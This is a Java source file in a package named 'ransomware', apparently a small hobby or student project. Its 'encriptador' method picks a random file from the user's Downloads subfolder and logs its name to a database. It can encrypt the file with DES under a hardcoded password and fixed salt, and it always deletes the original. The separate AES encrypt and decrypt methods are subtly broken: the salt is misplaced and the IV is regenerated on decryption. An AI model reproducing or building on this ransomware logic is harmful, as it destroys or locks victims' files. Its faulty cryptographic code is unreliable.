package ransomware;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import database.dataBase;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Arrays;

public class SecureFileEncryptor {
	private static final int AES_KEY_SIZE = 256;
	private static final int IV_SIZE = 16;
	private static final int SALT_SIZE = 16;
	private static final String ALGORITHM = "AES/CBC/PKCS5Padding";

	public static void encriptador(int opt) {
		String user = System.getProperty("user.home");
		String fileDowloands = user+"/Dowloands/holi";
		//String fileDowloands = user+"/Dowloands";
		
		File encryptFile = new File (user+"/ENCRIPTADO");
		File dowloands = new File (fileDowloands);
		File[] dowloandsArray = dowloands.listFiles();
		File[] encryptFileArray = encryptFile.listFiles();
		
		try {
			// encryptFile("prueba.txt", "prueba2.txt", "1234");
			// decryptFile("prueba2.txt", "prueba3.txt", "1234");
		        
			existFile(encryptFile);
			
		    if (dowloandsArray != null && dowloandsArray.length > 0) {
		            int i = (int) (Math.random() * dowloandsArray.length);
		            File file1 = (dowloandsArray[i]);//igualamos el valor de archivos
		            File file2 = new File(encryptFile+"/EncryptFile"+Paths.get(file1.getAbsolutePath()).getFileName());//suponemos que despues no cambia el nombre a otro archivo igual en el mismo sitio faltaria implementar carpeta q
		            dataBase.insertar(opt, (Paths.get(file1.getAbsolutePath()).getFileName()).toString());
					if(opt==1) {
					createFile(file2);
					cipher(Cipher.ENCRYPT_MODE, file1, file2, "1234");
					}
					file1.delete();
					if(opt==1) {
					for (int j = 0; j<encryptFileArray.length;j++) {
					file2 = encryptFileArray[j];
					File file3 = new File(encryptFile+"/DES"+Paths.get(file2.getAbsolutePath()).getFileName());
					cipher(Cipher.DECRYPT_MODE, file2, file3, "1234");
					file1.delete();
					}
					}
		    }
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	private static void existFile(File file) {
		if (!file.exists()) {
			  file.mkdir();
		}
	}
	private static void createFile(File file) {
		if (!file.exists()) {
			try {
				System.out.println(file.getAbsolutePath());
				file.createNewFile();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	
	public void encryptFile(String inputFile, String outputFile, String password) throws Exception {
		// Generate salt and derive key and IV from password and salt
		byte[] salt = generateSalt();
		byte[] key = generateKey(password, salt);
		byte[] iv = generateIV();

		// Create cipher and initialize with key and IV
		Cipher cipher = Cipher.getInstance(ALGORITHM);
		cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));

		// Read input file and encrypt data
		FileInputStream inputStream = new FileInputStream(inputFile);
		FileOutputStream outputStream = new FileOutputStream(outputFile);
		byte[] buffer = new byte[4096];
		int bytesRead;
		while ((bytesRead = inputStream.read(buffer)) != -1) {
			byte[] encryptedBytes = cipher.update(buffer, 0, bytesRead);
			outputStream.write(encryptedBytes);
		}
		byte[] finalEncryptedBytes = cipher.doFinal();
		outputStream.write(finalEncryptedBytes);

		// Write salt to the beginning of the output file
		outputStream.write(salt);

		// Close streams
		inputStream.close();
		outputStream.close();
	}

	public void decryptFile(String inputFile, String outputFile, String password) throws Exception {
		// Read salt from the beginning of the input file
		FileInputStream inputStream = new FileInputStream(inputFile);
		byte[] salt = new byte[SALT_SIZE];
		inputStream.read(salt);

		// Derive key and IV from password and salt
		byte[] key = generateKey(password, salt);
		byte[] iv = generateIV();

		// Create cipher and initialize with key and IV
		Cipher cipher = Cipher.getInstance(ALGORITHM);
		cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));

		// Read input file and decrypt data
		byte[] buffer = new byte[4096];
		int bytesRead;
		FileOutputStream outputStream = new FileOutputStream(outputFile);
		while ((bytesRead = inputStream.read(buffer)) != -1) {
			byte[] decryptedBytes = cipher.update(buffer, 0, bytesRead);
			outputStream.write(decryptedBytes);
		}
		// Write final decrypted bytes to the buffer and then to the output stream
		byte[] finalDecryptedBytes = cipher.doFinal();
		outputStream.write(finalDecryptedBytes);

		// Close streams
		inputStream.close();
		outputStream.close();
	}

	private byte[] generateSalt() {
		byte[] salt = new byte[SALT_SIZE];
		SecureRandom secureRandom = new SecureRandom();
		secureRandom.nextBytes(salt);
		return salt;
	}

	private byte[] generateKey(String password, byte[] salt) throws Exception {
		// Combine password and salt and calculate SHA-256 hash
		byte[] passwordBytes = password.getBytes("UTF-8");
		byte[] saltedPasswordBytes = Arrays.copyOf(passwordBytes, passwordBytes.length + SALT_SIZE);
		System.arraycopy(salt, 0, saltedPasswordBytes, passwordBytes.length, SALT_SIZE);
		MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
		byte[] key = sha256.digest(saltedPasswordBytes);

		// Derive 256-bit key using first 256 bits of SHA-256 hash
		return Arrays.copyOf(key, AES_KEY_SIZE / 8);
	}

	private byte[] generateIV() {
		byte[] iv = new byte[IV_SIZE];
		SecureRandom secureRandom = new SecureRandom();
		secureRandom.nextBytes(iv);
		return iv;
	}

	/**
	 * Encrypt or decrypt a file using a password //from w w w .j av a 2 s .c om
	 * 
	 * @param mode     Cipher.ENCRYPT_MODE or Cipher.DECRYPT_MODE
	 * @param fileIn   the file to encrypt or Decrypt.
	 * @param fileOut  the resulting encrypted/decrypted file
	 * @param password the password to use
	 * 
	 * @throws Exception
	 */
	private static void cipher(int mode, File fileIn, File fileOut, String password) throws Exception {
		if (mode != Cipher.ENCRYPT_MODE && mode != Cipher.DECRYPT_MODE) {
			throw new IllegalArgumentException("mode is not Cipher.ENCRYPT_MODE or Cipher.DECRYPT_MODE!");
		}

		if (fileIn == null) {
			throw new IllegalArgumentException("in File can not be null!");
		}

		if (fileOut == null) {
			throw new IllegalArgumentException("out File can not be null!");
		}

		if (password == null) {
			throw new IllegalArgumentException("password can not be null!");
		}

		PBEKeySpec pbeKeySpec;
		PBEParameterSpec pbeParamSpec;
		SecretKeyFactory keyFac;

		// Salt
		byte[] salt = { (byte) 0xc7, (byte) 0x73, (byte) 0x21, (byte) 0x8c, (byte) 0x7e, (byte) 0xc8, (byte) 0xee,
				(byte) 0x99 };

		// Iteration count
		int count = 1;

		// Create PBE parameter set
		pbeParamSpec = new PBEParameterSpec(salt, count);

		pbeKeySpec = new PBEKeySpec(password.toCharArray());
		keyFac = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
		SecretKey pbeKey = keyFac.generateSecret(pbeKeySpec);

		// Create PBE Cipher
		Cipher pbeCipher = Cipher.getInstance("PBEWithMD5AndDES");

		// Initialize PBE Cipher with key and parameters
		pbeCipher.init(mode, pbeKey, pbeParamSpec);

		InputStream in = null;
		OutputStream out = null;

		try {
			in = new BufferedInputStream(new FileInputStream(fileIn));
			out = new BufferedOutputStream(new FileOutputStream(fileOut));

			byte[] input = new byte[2048 * 10];
			int bytesRead;
			while ((bytesRead = in.read(input)) != -1) {
				byte[] output = pbeCipher.update(input, 0, bytesRead);
				if (output != null)
					out.write(output);
			}

			byte[] output = pbeCipher.doFinal();
			if (output != null)
				out.write(output);

			out.flush();
		} finally {

			if (mode == Cipher.ENCRYPT_MODE)
				System.out.println("fichero encriptado");
			else
				System.out.println("fichero desencriptado");

			in.close();
			out.close();
		}

	}

}
